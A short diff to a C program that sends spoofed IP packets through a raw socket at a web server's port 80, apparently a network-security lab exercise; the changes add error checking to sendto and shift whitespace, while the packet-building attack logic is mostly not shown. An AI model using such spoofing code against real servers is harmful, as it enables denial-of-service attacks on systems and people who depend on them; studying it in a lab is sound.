@@ -13,7 +13,7 @@
 #define DEST_PORT 80 // Attack the web server
 #define PACKET_LEN 1500
 
-// unsigned short calculate_tcp_checksum(struct ipheader *ip);
+//unsigned short calculate_tcp_checksum(struct ipheader *ip);
 
 // Given an IP packet, send it out using a raw socket.
 void send_raw_ip_packet(struct ipheader *ip)
@@ -32,7 +32,10 @@ void send_raw_ip_packet(struct ipheader *ip)
     dest_info.sin_addr = ip->iph_destip;
 
     // Step 4: Send the packet out.
-    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+    if(sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0)
+    {
+            perror("sendto failed");
+    }
     close(sock);
 }
 
@@ -72,6 +75,6 @@ int main()
         // Step 3: Finally, send the spoofed packet
         send_raw_ip_packet(ip);
     }
-
     return 0;
+
 }
